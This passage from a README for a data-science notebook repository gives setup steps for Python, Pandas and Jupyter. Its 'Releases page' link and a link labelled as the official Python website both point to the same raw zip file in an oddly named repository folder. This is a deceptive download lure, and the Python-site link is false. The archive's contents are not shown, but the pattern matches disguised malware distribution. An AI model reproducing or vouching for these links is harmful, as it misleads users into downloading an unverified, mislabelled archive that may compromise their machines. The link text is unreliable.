- Required Python libraries: Pandas, NumPy, Matplotlib (installation instructions below)

## 📥 Download & Install

To get started, you need to download the latest release. 

1. Visit the [Releases page](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip) to download the files.
2. Choose the notebook files that interest you.
3. Download them to your local machine.

Once you have downloaded the notebooks, follow these steps:

### 🛠️ Installing Python and Libraries

If you haven't installed Python yet:

1. Go to the official [Python website](https://raw.githubusercontent.com/yashrockzz/Data_science_estudos/main/Xiphius/Data_science_estudos.zip) and download the latest version.
2. Follow the installation instructions on the website.

To install the required libraries, open your command prompt (Windows) or terminal (macOS/Linux) and run the following commands:

```bash
pip install pandas numpy matplotlib
```

### 📓 Running the Notebooks

After installing Python and the required libraries, follow these steps to run the notebooks:

1. Open your command prompt or terminal.
2. Navigate to the folder where you downloaded the notebooks using the `cd` command. For example:

   ```bash
   cd path/to/your/downloaded/notebooks
   ```

3. Start Jupyter Notebook by typing:

   ```bash
   jupyter notebook
   ```

4. This will open a new tab in your browser showing the Jupyter interface.
5. Click on any notebook file (.ipynb) to open it. 

## 🔍 How to Use the Notebooks
